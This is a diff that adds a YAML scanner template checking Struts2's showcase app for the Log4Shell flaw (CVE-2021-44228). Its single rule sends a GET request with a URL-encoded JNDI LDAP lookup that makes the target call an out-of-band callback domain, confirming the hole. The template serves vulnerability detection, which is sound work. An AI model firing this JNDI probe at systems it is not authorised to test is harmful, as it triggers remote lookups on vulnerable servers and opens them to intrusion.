@@ -1,0 +1,18 @@
+name: Struts2_Log4Shell_CVE_2021_44228_3
+transport: http
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+detail:
+  dock: app="Struts2"
+  product: Struts2
+  homepage: https://struts.apache.org/
+  impact: ''
+  description: Struts2 struts2-showcase DefaultActionMapper.java存在log4j漏洞，在url中附带payload即可利用。
+rules:
+  r1:
+    method: GET
+    path: /struts2-showcase/$%7Bjndi:ldap://{{reverseDomain}}/tea%7D/
+    follow_redirects: false
+    expression: reverse.wait(5)
+expression: r1()
